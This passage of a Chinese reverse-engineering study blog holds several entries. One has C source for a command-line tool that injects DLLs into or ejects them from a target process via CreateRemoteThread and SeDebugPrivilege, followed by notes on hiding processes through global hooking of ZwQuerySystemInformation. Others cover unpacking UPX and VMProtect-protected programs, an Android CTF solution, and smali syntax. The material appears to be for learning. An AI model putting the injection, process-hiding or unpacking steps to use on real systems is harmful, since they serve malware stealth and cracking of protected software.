class="title">EjectDll</span><span class="params">(DWORD dwPID, LPCTSTR szDllName)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">BOOL bMore = FALSE, bFound = FALSE;</div><div class="line">HANDLE hSnapshot, hProcess, hThread;</div><div class="line">MODULEENTRY32 me = &#123; <span class="keyword">sizeof</span>(me) &#125;;</div><div class="line">LPTHREAD_START_ROUTINE pThreadProc;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (INVALID_HANDLE_VALUE == (hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID)))</div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line"></div><div class="line">bMore = Module32First(hSnapshot, &amp;me);</div><div class="line"><span class="keyword">for</span> (; bMore; bMore = Module32Next(hSnapshot, &amp;me))</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (!_tcsicmp(me.szModule, szDllName) || !_tcsicmp(me.szExePath, szDllName))</div><div class="line">&#123;</div><div class="line">bFound = TRUE;</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!bFound)</div><div class="line">&#123;</div><div class="line">CloseHandle(hSnapshot);</div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))</div><div class="line">&#123;</div><div class="line">CloseHandle(hSnapshot);</div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line">&#125;</div><div class="line"></div><div class="line">pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(<span class="string">L"kernel32.dll"</span>), <span class="string">"FreeLibrary"</span>);</div><div class="line">hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, me.modBaseAddr, <span class="number">0</span>, <span class="literal">NULL</span>);</div><div class="line">WaitForSingleObject(hThread, INFINITE);</div><div class="line"></div><div class="line">CloseHandle(hThread);</div><div class="line">CloseHandle(hProcess);</div><div class="line">CloseHandle(hSnapshot);</div><div class="line"></div><div class="line"><span class="keyword">return</span> TRUE;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">DWORD _EnableNTPrivilege(LPCTSTR szPrivilege, DWORD dwState)</div><div class="line">&#123;</div><div class="line">DWORD dwRtn = <span class="number">0</span>;</div><div class="line">HANDLE hToken;</div><div class="line"><span class="keyword">if</span> (OpenProcessToken(GetCurrentProcess(),</div><div class="line">TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken))</div><div class="line">&#123;</div><div class="line">LUID luid;</div><div class="line"><span class="keyword">if</span> (LookupPrivilegeValue(<span class="literal">NULL</span>, szPrivilege, &amp;luid))</div><div class="line">&#123;</div><div class="line">BYTE t1[<span class="keyword">sizeof</span>(TOKEN_PRIVILEGES) + <span class="keyword">sizeof</span>(LUID_AND_ATTRIBUTES)];</div><div class="line">BYTE t2[<span class="keyword">sizeof</span>(TOKEN_PRIVILEGES) + <span class="keyword">sizeof</span>(LUID_AND_ATTRIBUTES)];</div><div class="line">DWORD cbTP = <span class="keyword">sizeof</span>(TOKEN_PRIVILEGES) + <span class="keyword">sizeof</span>(LUID_AND_ATTRIBUTES);</div><div class="line"></div><div class="line">PTOKEN_PRIVILEGES pTP = (PTOKEN_PRIVILEGES)t1;</div><div class="line">PTOKEN_PRIVILEGES pPrevTP = (PTOKEN_PRIVILEGES)t2;</div><div class="line"></div><div class="line">pTP-&gt;PrivilegeCount = <span class="number">1</span>;</div><div class="line">pTP-&gt;Privileges[<span class="number">0</span>].Luid = luid;</div><div class="line">pTP-&gt;Privileges[<span class="number">0</span>].Attributes = dwState;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (AdjustTokenPrivileges(hToken, FALSE, pTP, cbTP, pPrevTP, &amp;cbTP))</div><div class="line">dwRtn = pPrevTP-&gt;Privileges[<span class="number">0</span>].Attributes;</div><div class="line">&#125;</div><div class="line"></div><div class="line">CloseHandle(hToken);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">return</span> dwRtn;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//主函数</span></div><div class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, TCHAR* argv[])</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (argc != <span class="number">4</span>) <span class="comment">//参数是不是4个</span></div><div class="line">&#123;</div><div class="line">usage();</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// adjust privilege</span></div><div class="line">_EnableNTPrivilege(SE_DEBUG_NAME, SE_PRIVILEGE_ENABLED);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!_tcsicmp(argv[<span class="number">1</span>], <span class="string">L"i"</span>)) <span class="comment">//判断是钩取</span></div><div class="line">InjectDll((DWORD)_tstoi(argv[<span class="number">2</span>]), argv[<span class="number">3</span>]);</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!_tcsicmp(argv[<span class="number">1</span>], <span class="string">L"e"</span>))<span class="comment">//判断是脱钩</span></div><div class="line">EjectDll((DWORD)_tstoi(argv[<span class="number">2</span>]), argv[<span class="number">3</span>]);</div><div class="line"></div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>运行结果:<br>钩取<br><img src="https://i.imgur.com/R54UpIg.png" alt=""><br>脱钩<br><img src="https://i.imgur.com/rUsuZTW.png" alt=""></p><p>个人总结:通过PE文件的结构，先获取线程基址，从ImageBase开始，经由PE签名找到IDT：<br>ImageBase-&gt;IDT-&gt;IAT(dll)-&gt;函数</p><h1 id="方式3——进程隐藏"><a href="#方式3——进程隐藏" class="headerlink" title="方式3——进程隐藏"></a>方式3——进程隐藏</h1><p>进程隐藏就是将要隐藏的进程藏在其他的进程中，实现进程隐藏的关键不是进程本身，而是其他进程。其中用户模式下最常用的是ntdll.ZwQuerySystemInformation() API钩取技术。</p><p>假如我们要隐藏test.exe进程，那么就要钩取ProcExp.exe(进程查看器或taskmgr.exe任务管理器)的ntdll.ZwQuerySystemInformation() API，</p><h2 id="2个问题"><a href="#2个问题" class="headerlink" title="2个问题"></a>2个问题</h2><p>1、钩取的进程数<br>如果进程查看器和任务管理器多开几个，那么进程钩取一个，那是不可以的，所以要钩取系统中运行的所有进程。<br>2、新创进程<br>如果当钩取了系统中运行的所有进程，这时又新建一个ProcExp.exe，而这个进程又没有被钩取。</p><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>对于上面2个问题，我们隐藏test.exe进程时需要钩取系统中运行的所有进程的ntdll.ZwQuerySystemInformation() API，并且对后面将要启动的所有进程也进行相同的操作(当然这是全自动的啦)，这叫全局钩取。</p><h1 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h1><p>逆向工程核心原理</p><h2 id="最后，文学还是很重要的，借助诗圣两句提高文学素养"><a href="#最后，文学还是很重要的，借助诗圣两句提高文学素养" class="headerlink" title="最后，文学还是很重要的，借助诗圣两句提高文学素养"></a>最后，文学还是很重要的，借助诗圣两句提高文学素养</h2><p>绝代有佳人，幽居在空谷。<br>但见新人笑，那闻旧人哭。<br>——佳人</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;逆向分析之”花”。windows的Hook是程序设计中最为灵活多变的技巧之一。Hook有两种含义:1、系统提供的消息Hook机制;2、自定义的Hook编程技巧，&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>RE_常见的脱壳方法</title>
    <link href="http://yoursite.com/2018/03/15/re_tou_ke/"/>
    <id>http://yoursite.com/2018/03/15/re_tou_ke/</id>
    <published>2018-03-15T07:17:45.295Z</published>
    <updated>2018-04-04T03:22:21.032Z</updated>
    
    <content type="html"><![CDATA[<p>软件壳出于程序作者想对程序资源压缩、注册保护的目的，把壳分为压缩壳和加密壳(强壳)两种，压缩壳只是为了减小程序体积对资源进行压缩，加密壳是程序输入表等等进行加密保护。<br><a id="more"></a></p><h1 id="壳的工作原理"><a href="#壳的工作原理" class="headerlink" title="壳的工作原理"></a>壳的工作原理</h1><p>某些加壳程序加壳后会修改了原来导入目录表的位置为壳的导入表，这样默认的导入表指向壳部分的导入表，你就看不到原来的导入表的内容了。程序启动后，操作系统为壳的导入表加载，在壳代码运行完成之后，壳代码会跳到原程序的入口点OEP，壳模拟操作系统填充原来导入表IAT，这样保证代码段能正常调用函数。一般壳的工作原理也就是这样了，随着现在加壳加密技术的进步，不是所有加壳软件都会这样。</p><h1 id="脱壳原理"><a href="#脱壳原理" class="headerlink" title="脱壳原理"></a>脱壳原理</h1><p>首先修改被加壳程序的入口点到程序原来的OEP，然后修改PE程序导入表目录地址为原来导入表地址，或者新建一个节，将这个新节作为导入表节，并将原导入表内容写入新节导入表。</p><h1 id="普通壳脱壳"><a href="#普通壳脱壳" class="headerlink" title="普通壳脱壳"></a>普通壳脱壳</h1><p>例如：先用peid查一下壳，发现有壳(这里是upx壳)[查壳工具主要以peid和fileinfo这两个软件为代表]<br><img src="https://i.imgur.com/nI3hfj8.png" alt=""><br>接下里分别用下面5种方法脱壳</p><h2 id="1、单步跟踪法"><a href="#1、单步跟踪法" class="headerlink" title="1、单步跟踪法"></a>1、单步跟踪法</h2><p>一般先f8单步步过，遇见向上的f4跳到下一条语句,然后会发现，一般有很大的跳转（大跨段），比如jmp XXXXXX 或者JE XXXXXX或者有RETN的一般很快就会到程序的OEP</p><h2 id="2、ESP定律法"><a href="#2、ESP定律法" class="headerlink" title="2、ESP定律法"></a>2、ESP定律法</h2><p>原理:利用堆栈平衡<br>OD加载，会看见pushad,运行一步，下硬件断点<br><img src="https://i.imgur.com/reV3ht1.png" alt=""><br>运行,就会在硬件断点的位置啦，删除硬件断点，接着往下执行几步就可以看见OEP啦<br><img src="https://i.imgur.com/1zMXa3o.png" alt=""></p><h2 id="3、两次内存镜像法"><a href="#3、两次内存镜像法" class="headerlink" title="3、两次内存镜像法"></a>3、两次内存镜像法</h2><p>如图:<br><img src="https://i.imgur.com/V9QVnMh.png" alt=""><br>点击运行，到达这里<br><img src="https://i.imgur.com/vIx32jU.png" alt=""><br>接着<br><img src="https://i.imgur.com/WTjRmsT.png" alt=""><br>点击运行<br><img src="https://i.imgur.com/zTFsIUo.png" alt=""></p><h2 id="4、一步到达OEP-对少数壳有用"><a href="#4、一步到达OEP-对少数壳有用" class="headerlink" title="4、一步到达OEP(对少数壳有用)"></a>4、一步到达OEP(对少数壳有用)</h2><p>OD加载后，Ctrl+F，搜索popad,接着f4运行到这里，接着一步步往下找就可以找到OEP啦。</p><h2 id="5、模拟跟踪法"><a href="#5、模拟跟踪法" class="headerlink" title="5、模拟跟踪法"></a>5、模拟跟踪法</h2><p>上面都可以属于模拟跟踪法。</p><h2 id="6、SFX"><a href="#6、SFX" class="headerlink" title="6、SFX"></a>6、SFX</h2><p><img src="https://i.imgur.com/0D2h6Eg.png" alt=""><br>重载后，自动跳到程序入口点</p><h2 id="7、修复IAT"><a href="#7、修复IAT" class="headerlink" title="7、修复IAT"></a>7、修复IAT</h2><p>先找到OEP,先用loadPE脱下壳，然后用ImportREC修复IAT,操作如下:<br>loadPE先dump下文件<br><img src="https://i.imgur.com/kRRTIBH.png" alt=""><br>PEID查<br><img src="https://i.imgur.com/zmcHw4T.png" alt=""><br>ImportREC修复IAT(这里我是手动OEP修改的,有些直接自己获取OEP)<br><img src="https://i.imgur.com/o5bCSh0.png" alt=""><br>接着转储文件选择刚才dump下来的文件，点击运行<br><img src="https://i.imgur.com/LQMaBx6.png" alt=""></p><h1 id="vmprotect脱壳"><a href="#vmprotect脱壳" class="headerlink" title="vmprotect脱壳"></a>vmprotect脱壳</h1><p>这里有vc的程序作为示例:<br>正常的vc的程序的入口是的机器码是: 55 8b ec<br>而vmp的壳的程序，是找不到55 8b ec,这里学习记录一下脱壳方法<br>1、用exeinfo PE查壳<br><img src="https://i.imgur.com/vTGY7cr.png" alt=""><br>2、设置OD：选项-&gt;调试设置-&gt;事件-&gt;系统断点<br>3、将程序载入od,f9运行，便会来到一个call，(ctrl+g)搜索，VirtualProtect:<br><img src="https://i.imgur.com/GP0Voer.png" alt=""><br>4、接着便会来到一个地址，在这里下断点，继续f9,<br><img src="https://i.imgur.com/0qeQszn.png" alt=""><br>5、然后运行几次f9都会断到这里，NewProtect = READONLY且最后一次时(运行几次就知道啦，低位不会变)，此时alt+B，断点界面取消或禁用断点，然后alt+M，对text段下内存访问断点：<br><img src="https://i.imgur.com/xU4fNkV.png" alt=""><br>6、来到这里<br><img src="https://i.imgur.com/Qpgt36g.png" alt=""><br>7、(ctrl+g)搜索401000，硬件访问断点。运行，接着可以搜索特征码:EB0B85F375078BC6C1E0100BF0<br>8、这时就会找到OEP啦，可以直接dump出来，IDA可以看见算法啦，如果要运行，还需要IAT修复<br>这里分享一下vmp脱壳教程<br>链接: <a href="http://pan.baidu.com/s/1qWt14lA" target="_blank" rel="external">http://pan.baidu.com/s/1qWt14lA</a> 密码: 2wmq 解压密码：www.lthack.com</p><h2 id="文学修养"><a href="#文学修养" class="headerlink" title="文学修养"></a>文学修养</h2><p>衣带渐宽终不悔，<br>为伊消得人憔悴。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;软件壳出于程序作者想对程序资源压缩、注册保护的目的，把壳分为压缩壳和加密壳(强壳)两种，压缩壳只是为了减小程序体积对资源进行压缩，加密壳是程序输入表等等进行加密保护。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Android_之_DDMS_与_修改smali混用</title>
    <link href="http://yoursite.com/2018/03/12/android_re_3_ddms/"/>
    <id>http://yoursite.com/2018/03/12/android_re_3_ddms/</id>
    <published>2018-03-12T08:12:47.537Z</published>
    <updated>2018-03-22T03:38:44.310Z</updated>
    
    <content type="html"><![CDATA[<p>学习了这么久，实践才是检测真理的唯一真理呀(今天看见两个国外贼漂亮的小姐姐)<br><a id="more"></a></p><h1 id="DDMS与修改smali混用"><a href="#DDMS与修改smali混用" class="headerlink" title="DDMS与修改smali混用"></a>DDMS<em>与</em>修改smali混用</h1><h2 id="1、题目"><a href="#1、题目" class="headerlink" title="1、题目"></a>1、题目</h2><p>链接：<a href="https://pan.baidu.com/s/1YOXnJYyv2QWfWnP7Jwd2JQ" target="_blank" rel="external">https://pan.baidu.com/s/1YOXnJYyv2QWfWnP7Jwd2JQ</a> 密码：fsvl<br>用工具android killer打开apk,先在编译成apk,发现程序能正常运行，并没有apk验证,那么可以改smali代码啦，也许不需要。<br><img src="https://i.imgur.com/ugFIzub.png" alt=""><br>接下来看simple.check()函数啦，然后你就会发现，这些人怎么有耐心写这么长的代码(头大)。经过分析可以发现类中成员变量A[]就是存储用户输入的字符串，B[]就是存储flag的<br><img src="https://i.imgur.com/4hqUtND.png" alt=""><br>可以直接使用“smali 代码注入”，插入LOG，直接打印出计算后的值<br>1、构造打印函数<br><img src="https://i.imgur.com/bR8PciG.png" alt=""><br>2、插入打印位置<br><img src="https://i.imgur.com/EA9fy2Z.png" alt=""><br>接着就是反编译成apk,然后用模拟器打开，接着ddms动态<br>3、ddms动态调试<br><img src="https://i.imgur.com/oUvXMAu.png" alt=""></p><h1 id="Androidjni编程"><a href="#Androidjni编程" class="headerlink" title="Androidjni编程"></a>Android<em>jni</em>编程</h1><h2 id="1、什么是JNI"><a href="#1、什么是JNI" class="headerlink" title="1、什么是JNI"></a>1、什么是JNI</h2><p>JNI(Java Native Interface):java本地开发接口JNI是一个协议，这个协议用来沟通java代码和外部的本地代码(c/c++)外部的c/c++代码也可以调用java代码。效率上 C/C++是本地语言，比java更高效代码移植，如果之前用C语言开发过模块，可以复用已经存在的c代码java反编译比C语言容易，一般加密算法都是用C语言编写，不容易被反编译</p><h2 id="2、交叉编译"><a href="#2、交叉编译" class="headerlink" title="2、交叉编译"></a>2、交叉编译</h2><p>交叉编译即在一个平台，编译出另一个平台能够执行的二进制代码。原理:即在一个平台上，模拟其他平台的特性。</p><h2 id="1、常见的交叉编译工具"><a href="#1、常见的交叉编译工具" class="headerlink" title="1、常见的交叉编译工具"></a>1、常见的交叉编译工具</h2><p>NDK(Native Development Kit): 开发JNI必备工具，就是模拟其他平台特性类编译代码的工具<br>CDT(C/C++ Development Tools): 是Eclipse开发C语言的一个插件，高亮显示C语言的语法<br>Cygwin: 一个Windows平台的Unix模拟器</p><h3 id="2、NDK的目录结构"><a href="#2、NDK的目录结构" class="headerlink" title="2、NDK的目录结构"></a>2、NDK的目录结构</h3><p>build/tools：linux的批处理文件<br>platforms：编译c代码需要使用的头文件和类库<br>prebuilt：预编译使用的二进制可执行文件<br>sample：jni的使用例子<br>source：ndk的源码<br>toolchains：工具链<br>ndk-build.cmd:编译打包c代码的一个指令，需要配置系统环境变量</p><h2 id="3、Android-Studio之NDK安装"><a href="#3、Android-Studio之NDK安装" class="headerlink" title="3、Android_Studio之NDK安装"></a>3、Android_Studio之NDK安装</h2><p>搭建ndk环境<br>1、路径： File-&gt;Setting-&gt;看图<br><img src="https://i.imgur.com/kbz3yQ3.png" alt=""><br>(这个要等待一段时间)<br>2、新建项目<br><img src="https://i.imgur.com/TtbtwFr.png" alt=""><br>然后一直默认下一步，接着自动生成一个demo。<br>运行结果:<br><img src="https://i.imgur.com/U1eGcLP.png" alt=""><br>将apk改成zip<br>发现.so文件<br><img src="https://i.imgur.com/Y91D8OW.png" alt=""></p><p>师傅的智慧是无线的，羡慕羡慕。<br>参考:<br><a href="https://www.ichunqiu.com/writeup/detail/35" target="_blank" rel="external">https://www.ichunqiu.com/writeup/detail/35</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;学习了这么久，实践才是检测真理的唯一真理呀(今天看见两个国外贼漂亮的小姐姐)&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Android与Apk的文件结构</title>
    <link href="http://yoursite.com/2018/03/11/android_construction/"/>
    <id>http://yoursite.com/2018/03/11/android_construction/</id>
    <published>2018-03-11T03:03:06.688Z</published>
    <updated>2018-03-13T05:52:11.166Z</updated>
    
    <content type="html"><![CDATA[<p>Android与Apk的文件结构在学习逆向很重要的一步。随便记录一下smali语法<br><a id="more"></a></p><h1 id="1、Android"><a href="#1、Android" class="headerlink" title="1、Android"></a>1、Android</h1><p>Android 是google公司针对手机开发的一个平台，并公布了其中大部分代码，其大部分应用程序都是用JAVA开发的。</p><h2 id="系统结构"><a href="#系统结构" class="headerlink" title="系统结构"></a>系统结构</h2><p>android的系统架构和其操作系统一样，采用了分层的架构。从架构图看，android分为四个层，从高层到低层分别是应用程序层、应用程序框架层、系统运行库层和linux核心层。<br><img src="https://i.imgur.com/gYQwOom.png" alt=""><br>从而看出liunx是很重要的，蓝色的代表java程序，黄色的代码为运行JAVA程序而实现的虚拟机，绿色部分为C/C++语言编写的程序库，红色的代码内核(linux内核+drvier)。</p><h3 id="1、应用程序"><a href="#1、应用程序" class="headerlink" title="1、应用程序"></a>1、应用程序</h3><p>Android会同一系列核心应用程序包一起发布，应用程序基本都是使用JAVA语言编写的。</p><h3 id="2、应用程序框架"><a href="#2、应用程序框架" class="headerlink" title="2、应用程序框架"></a>2、应用程序框架</h3><p>开发人员也可以完全访问核心应用程序所使用的API 框架，该应用程序的架构设计简化了组件的重用。</p><h3 id="3、系统运行库"><a href="#3、系统运行库" class="headerlink" title="3、系统运行库"></a>3、系统运行库</h3><p>(1)、程序库<br>Android 包含一些C/C++库，这些库能被Android系统中不同的组件使用。它们通过 Android 应用程序框架为开发者提供服务。其实Android并非讲所有的设备驱动都放在linux内核里面，而是实现在userspace空间，这么做的主要原因是GPL协议，Linux是遵循该 协议来发布的，也就意味着对 linux内核的任何修改，都必须发布其源代码。而现在这么做就可以避开而无需发布其源代码，毕竟它是用来赚钱的。<br>(2)Android 运行库<br>Android 包括了一个核心库，该核心库提供了JAVA编程语言核心库的大多数功能。每一个Android应用程序都在它自己的进程中运 行，都拥有一个独立的Dalvik虚拟 机实例。Dalvik被设计成一个设备可以同时高效地运行多个虚拟系统。 Dalvik虚拟机执行（.dex）的Dalvik可执行文件，该格式文件针对小内存使用做了优化。同时Dalvik虚拟机依赖于linux内核的一些功能，比如线程机制和底层内存管理机制。</p><h3 id="4、Linux内核"><a href="#4、Linux内核" class="headerlink" title="4、Linux内核"></a>4、Linux内核</h3><p>Android 的核心系统服务依赖于 Linux 2.6 内核，如安全性，内存管理，进程管理， 网络协议栈和驱动模型。 Linux 内核也同时作为硬件和软件栈之间的抽象层。</p><h1 id="2、Apk的文件结构"><a href="#2、Apk的文件结构" class="headerlink" title="2、Apk的文件结构"></a>2、Apk的文件结构</h1><p>APK就是一个zip压缩包，解开这个APK包我们可以看到以下的结构：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">META-INF：签名文件</div><div class="line">res：资源文件</div><div class="line">AndroidManifest.xml：android 配置文件</div><div class="line">classes.dex：java代码编译后产生的类似字节码的文件（dalvik 字节码）</div><div class="line">resources.arsc：配置文件</div><div class="line">其他文件：诸如assets等，或者lib（native so 代码）等目录</div></pre></td></tr></table></figure></p><p>apk的核心逻辑主要在 classes.dex(代码主要存在的文件)，有些代码会在.so(动态链接库)文件 [最头痛的文件].</p><h1 id="3、Smali语法"><a href="#3、Smali语法" class="headerlink" title="3、Smali语法"></a>3、Smali语法</h1><h2 id="1、函数"><a href="#1、函数" class="headerlink" title="1、函数"></a>1、函数</h2><h3 id="函数的定义一般为："><a href="#函数的定义一般为：" class="headerlink" title="函数的定义一般为："></a>函数的定义一般为：</h3><p>Func-Name (Para-Type1Para-Type2Para-Type3…)Return-Type<br>注意参数与参数之间没有任何分隔符<br>1、check ()V         —-&gt; void check()<br>2、check (III)Z      —-&gt; boolean check(int,int,int)<br>3、check (Z[I[Ijava/lang/String)java/lang/String;   —-&gt; String check(boolean,int[],int[],String)</p><p>而函数又分为direct method和virtual method。direct method就是private函数，其余的public和protected函数都属于virtual method。</p><h3 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h3><p>格式：.method + 访问修饰符 + 方法名(参数表) + 返回值类型<br>.method // 方法的开始<br>.end method // 方法结束</p><p>在调用函数时，有invoke-direct，invoke-virtual，另外还有invoke-static、invoke-super以及invoke-interface等几种不同的指令。<br>对象 -&gt; 方法名(参数类型)返回值<br>invoke-virtual 非静态方法调用<br>invoke-static  静态方法调用<br>invoke-direct  构造方法调用？<br>invoke-super   调用父类方法<br>invoke-interface 调用接口<br>（1）、invoke-static：顾名思义就是调用static函数的，因为是static函数，所以比起其他调用少一个参数，例如：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span>-<span class="built_in">string</span> v0, <span class="string">"fmodex"</span>  </div><div class="line">invoke-<span class="keyword">static</span> &#123;v0&#125;, Ljava/lang/System;-&gt;loadLibrary(Ljava/lang/String;)V</div></pre></td></tr></table></figure></p><p> 这个是调用static void System.loadLibrary(String)来加载NDK编译的so库用的方法，同样也是这里v0就是参数”fmodex”了。<br>（2）、invoke-virtual：用于调用protected或public函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sget-object v0, Lcom/disney/WMW/WMWActivity;-&gt;shareHandler:Landroid/os/Handler;</div><div class="line">invoke-<span class="keyword">virtual</span> &#123;v0, v3&#125;, Landroid/os/Handler;-&gt;removeCallbacksAndMessages(Ljava/lang/Object;)V</div></pre></td></tr></table></figure></p><p>v0是shareHandler:Landroid/os/Handler，v3是传递给removeCallbackAndMessage方法的Ljava/lang/Object参数</p><p>调用返回结果:用到move-result（返回基本数据类型）和move-result-object（返回对象）指令</p><h3 id="smali中函数实体分析"><a href="#smali中函数实体分析" class="headerlink" title="smali中函数实体分析"></a>smali中函数实体分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">.<span class="function">method <span class="keyword">protected</span> <span class="title">onDestroy</span><span class="params">()</span>V  </span></div><div class="line">    .locals 0  </div><div class="line">       </div><div class="line">    .prologue  </div><div class="line">    .line <span class="number">277</span>  </div><div class="line">    invoke-super &#123;p0&#125;, Lcom/disney/common/BaseActivity;-&gt;onDestroy()V  </div><div class="line">       </div><div class="line">    .line <span class="number">279</span>  </div><div class="line">    <span class="keyword">return</span>-<span class="keyword">void</span>  </div><div class="line">.end method</div></pre></td></tr></table></figure><p>.local 0，这句话很重要，标明了你在这个函数中最少要用到的本地寄存器的个数。在这里，由于只需要调用一个父类的onDestroy()处理，所以只需要用到p0，所以使用到的本地寄存器数为0。如果不清楚这个规则，很容易在植入代码后忘记修改.local 的值，那么回编译后运行时将会得到一个VerifyError错误，而且极难发现问题所在。</p><h2 id="2、语法"><a href="#2、语法" class="headerlink" title="2、语法"></a>2、语法</h2><h3 id="if与switch判断语句"><a href="#if与switch判断语句" class="headerlink" title="if与switch判断语句"></a>if与switch判断语句</h3><p>if判断一共有12条指令：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>-eq vA, VB, cond_** 如果vA等于vB则跳转到cond_**。相当于<span class="keyword">if</span> (vA==vB)</div><div class="line"><span class="keyword">if</span>-ne vA, VB, cond_** 如果vA不等于vB则跳转到cond_**。相当于<span class="keyword">if</span> (vA!=vB)</div><div class="line"><span class="keyword">if</span>-lt vA, VB, cond_** 如果vA小于vB则跳转到cond_**。相当于<span class="keyword">if</span> (vA&lt;vB)</div><div class="line"><span class="keyword">if</span>-le vA, VB, cond_** 如果vA小于等于vB则跳转到cond_**。相当于<span class="keyword">if</span> (vA&lt;=vB)</div><div class="line"><span class="keyword">if</span>-gt vA, VB, cond_** 如果vA大于vB则跳转到cond_**。相当于<span class="keyword">if</span> (vA&gt;vB)</div><div class="line"><span class="keyword">if</span>-ge vA, VB, cond_** 如果vA大于等于vB则跳转到cond_**。相当于<span class="keyword">if</span> (vA&gt;=vB)</div><div class="line"></div><div class="line"><span class="keyword">if</span>-eqz vA, :cond_** 如果vA等于<span class="number">0</span>则跳转到:cond_** 相当于<span class="keyword">if</span> (VA==<span class="number">0</span>)</div><div class="line"><span class="keyword">if</span>-nez vA, :cond_** 如果vA不等于<span class="number">0</span>则跳转到:cond_**相当于<span class="keyword">if</span> (VA!=<span class="number">0</span>)</div><div class="line"><span class="keyword">if</span>-ltz vA, :cond_** 如果vA小于<span class="number">0</span>则跳转到:cond_**相当于<span class="keyword">if</span> (VA&lt;<span class="number">0</span>)</div><div class="line"><span class="keyword">if</span>-lez vA, :cond_** 如果vA小于等于<span class="number">0</span>则跳转到:cond_**相当于<span class="keyword">if</span> (VA&lt;=<span class="number">0</span>)</div><div class="line"><span class="keyword">if</span>-gtz vA, :cond_** 如果vA大于<span class="number">0</span>则跳转到:cond_**相当于<span class="keyword">if</span> (VA&gt;<span class="number">0</span>)</div><div class="line"><span class="keyword">if</span>-gez vA, :cond_** 如果vA大于等于<span class="number">0</span>则跳转到:cond_**相当于<span class="keyword">if</span> (VA&gt;=<span class="number">0</span>)</div></pre></td></tr></table></figure></p><p>Switch语句<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">整形顺序结构<span class="keyword">switch</span>(<span class="keyword">int</span>)</div><div class="line">    :pswitch_data_0</div><div class="line">    .packed-<span class="keyword">switch</span> <span class="number">0x0</span></div><div class="line">        :pswitch_0</div><div class="line">        :pswitch_1</div><div class="line">.end packed-<span class="keyword">switch</span></div><div class="line">整形非顺序结构<span class="keyword">switch</span>(<span class="keyword">int</span>)</div><div class="line">    :sswitch_data_0</div><div class="line">    .sparse-<span class="keyword">switch</span></div><div class="line">        <span class="number">0x0</span> -&gt; :sswitch_0</div><div class="line">        <span class="number">0x1</span> -&gt; :sswitch_1</div><div class="line">        <span class="number">0xa</span> -&gt; :sswitch_2</div><div class="line">.end sparse-<span class="keyword">switch</span></div><div class="line"><span class="keyword">switch</span>(String)</div><div class="line">    :pswitch_data_0</div><div class="line">    .packed-<span class="keyword">switch</span> <span class="number">0x41</span></div><div class="line">        :pswitch_0</div><div class="line">        :pswitch_1</div><div class="line">    .end packed-<span class="keyword">switch</span></div><div class="line"></div><div class="line">    :pswitch_data_1</div><div class="line">    .packed-<span class="keyword">switch</span> <span class="number">0x0</span></div><div class="line">        :pswitch_2</div><div class="line">        :pswitch_3</div><div class="line">    .end packed-<span class="keyword">switch</span></div></pre></td></tr></table></figure></p><h3 id="循环语句"><a 